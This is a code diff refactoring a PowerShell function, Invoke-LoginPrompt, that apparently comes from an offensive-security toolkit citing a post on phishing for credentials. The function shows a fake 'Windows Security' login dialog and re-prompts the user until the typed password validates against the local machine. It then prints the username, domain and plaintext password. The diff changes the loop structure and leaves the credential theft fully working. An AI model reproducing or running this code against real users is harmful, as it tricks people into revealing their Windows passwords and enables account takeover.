@@ -15,24 +15,18 @@ http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask
 #>
 
 function Invoke-LoginPrompt{
-    $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
-    $username = "$env:username"
-    $domain = "$env:userdomain"
-    $full = "$domain" + "\" + "$username"
-    $password = $cred.GetNetworkCredential().password
-    Add-Type -assemblyname System.DirectoryServices.AccountManagement
-    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
-    while($DS.ValidateCredentials("$full", "$password") -ne $True){
-        $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
+    $InitialPrompt = "Please enter user credentials"
+    $RetryPrompt = "Invalid credentials. Please try again"
+    do {
+        $cred = $Host.ui.PromptForCredential("Windows Security", $(If ($cred) {$RetryPrompt} Else {$InitialPrompt}), "$env:userdomain\$env:username","")
         $username = "$env:username"
         $domain = "$env:userdomain"
         $full = "$domain" + "\" + "$username"
         $password = $cred.GetNetworkCredential().password
         Add-Type -assemblyname System.DirectoryServices.AccountManagement
         $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
-        $DS.ValidateCredentials("$full", "$password") | out-null
-        }
-     
+    } while($DS.ValidateCredentials("$full", "$password") -ne $True)
+    
      $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
      $output
 }
